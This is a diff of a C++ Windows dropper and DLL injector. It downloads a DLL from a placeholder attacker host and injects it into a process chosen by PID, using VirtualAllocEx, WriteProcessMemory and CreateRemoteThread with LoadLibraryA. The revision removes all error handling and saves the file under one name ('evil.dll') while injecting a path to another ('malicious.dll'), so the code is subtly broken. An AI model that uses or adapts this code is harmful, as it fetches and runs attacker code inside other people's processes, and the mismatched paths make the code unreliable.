@@ -6,63 +6,43 @@
 #include <urlmon.h> // For URLDownloadToFile
 #pragma comment(lib, "urlmon.lib")
 
-const char* dllURL = "http://malicious.com/test.dll"; // URL of the malicious DLL
+const char* dllURL = "http://attacker.com/malicious.dll"; 
 
 int main(int argc, char* argv[]) {
     // Download the DLL file
-    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\path\\test.dll", 0, NULL);
+    HRESULT hr = URLDownloadToFile(NULL, dllURL, "C:\\Tools\\evil.dll", 0, NULL);
     if (FAILED(hr)) {
-        printf("Failed to download DLL: 0x%x\n", hr); // Print error code if download fails
+        printf("Failed to download DLL: 0x%x\n", hr);
         return 1;
     }
 
-    // Continue with the injection process
-    HANDLE phandle; // Process handle
-    HANDLE rthread; // Remote thread
-    LPVOID rbuffer; // Remote buffer
+    // Now, continue with the injection process
+    HANDLE phandle; // process handle
+    HANDLE rthread; // remote thread
+    LPVOID rbuffer; // remote buffer
 
     // Get a handle to kernel32.dll and retrieve the address of LoadLibraryA function
     HMODULE hKernel32 = GetModuleHandle("Kernel32");
     VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
 
-    // Parse the process ID we provide
+    // parse the process ID
     if (atoi(argv[1]) == 0) {
         printf("PID not found :( exiting...\n");
         return -1;
     }
 
-    // Open the target process
+    // open the target process
+    printf("PID: %i", atoi(argv[1]));
     phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-    if (phandle == NULL) {
-        printf("Failed to open target process. Error code: %d\n", GetLastError()); // Print error if failed to open process
-        return -1;
-    }
 
     // Allocate memory buffer in the target process for DLL path
-    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\path\\test.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    if (rbuffer == NULL) {
-        printf("Failed to allocate memory in target process. Error code: %d\n", GetLastError()); // Print error if memory allocation fails
-        CloseHandle(phandle);
-        return -1;
-    }
+    rbuffer = VirtualAllocEx(phandle, NULL, strlen("C:\\Tools\\malicious.dll") + 1, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 
     // Copy DLL file path to the allocated memory in the target process
-    if (!WriteProcessMemory(phandle, rbuffer, "C:\\path\\test.dll", strlen("C:\\path\\test.dll") + 1, NULL)) {
-        printf("Failed to write to target process memory. Error code: %d\n", GetLastError()); // Print error if memory writing fails
-        VirtualFreeEx(phandle, rbuffer, 0, MEM_RELEASE);
-        CloseHandle(phandle);
-        return -1;
-    }
+    WriteProcessMemory(phandle, rbuffer, "C:\\Tools\\malicious.dll", strlen("C:\\Tools\\malicious.dll") + 1, NULL);
 
     // Create a remote thread in the target process to load the DLL
     rthread = CreateRemoteThread(phandle, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rbuffer, 0, NULL);
-    if (rthread == NULL) {
-        printf("Failed to create remote thread in target process. Error code: %d\n", GetLastError()); // Print error if thread creation fails
-        VirtualFreeEx(phandle, rbuffer, 0, MEM_RELEASE);
-        CloseHandle(phandle);
-        return -1;
-    }
-
-    CloseHandle(phandle); // Close the process handle
+    CloseHandle(phandle);
     return 0;
 }
